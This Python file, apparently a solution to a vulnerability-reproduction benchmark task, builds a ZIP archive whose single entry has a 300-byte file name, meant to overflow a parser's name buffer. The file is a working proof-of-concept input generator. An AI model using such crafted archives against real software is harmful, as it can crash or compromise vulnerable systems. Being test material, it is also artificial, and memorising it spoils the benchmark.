import struct
import binascii

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a minimal ZIP archive with a single entry whose filename exceeds 256 bytes
        filename_len = 300
        filename = b"A" * filename_len  # long filename to trigger overflow
        data = b"x"  # minimal file content (1 byte)
        crc = binascii.crc32(data) & 0xFFFFFFFF

        # Local file header
        # signature, version, flags, method, mtime, mdate, crc, comp_size, uncomp_size, fname_len, extra_len
        local_header = struct.pack(
            "<IHHHHHIIIHH",
            0x04034B50,  # Local file header signature
            20,          # Version needed to extract
            0,           # General purpose bit flag
            0,           # Compression method (store)
            0,           # File last mod time
            0,           # File last mod date
            crc,         # CRC-32
            len(data),   # Compressed size
            len(data),   # Uncompressed size
            len(filename),  # File name length
            0            # Extra field length
        )

        # Compute central directory offset (after local header + filename + data)
        local_header_offset = 0
        cd_offset = len(local_header) + len(filename) + len(data)

        # Central directory header
        # signature, ver_made, ver_needed, flags, method, mtime, mdate,
        # crc, comp_size, uncomp_size, fname_len, extra_len, comment_len,
        # disk_start, int_attr, ext_attr, rel_offset
        cd_header = struct.pack(
            "<IHHHHHHIIIHHHHHII",
            0x02014B50,   # Central file header signature
            20,           # Version made by
            20,           # Version needed to extract
            0,            # General purpose bit flag
            0,            # Compression method
            0,            # File last mod time
            0,            # File last mod date
            crc,          # CRC-32
            len(data),    # Compressed size
            len(data),    # Uncompressed size
            len(filename),# File name length
            0,            # Extra field length
            0,            # File comment length
            0,            # Disk number start
            0,            # Internal file attributes
            0,            # External file attributes
            local_header_offset  # Relative offset of local header
        )

        cd_size = len(cd_header) + len(filename)

        # End of central directory record
        # signature, disk_no, cd_disk_no, entries_this_disk, total_entries, cd_size, cd_offset, comment_len
        eocd = struct.pack(
            "<IHHHHIIH",
            0x06054B50,  # EOCD signature
            0,           # Number of this disk
            0,           # Disk where central directory starts
            1,           # Number of central directory records on this disk
            1,           # Total number of central directory records
            cd_size,     # Size of central directory
            cd_offset,   # Offset of start of central directory
            0            # Comment length
        )

        zip_bytes = local_header + filename + data + cd_header + filename + eocd
        return zip_bytes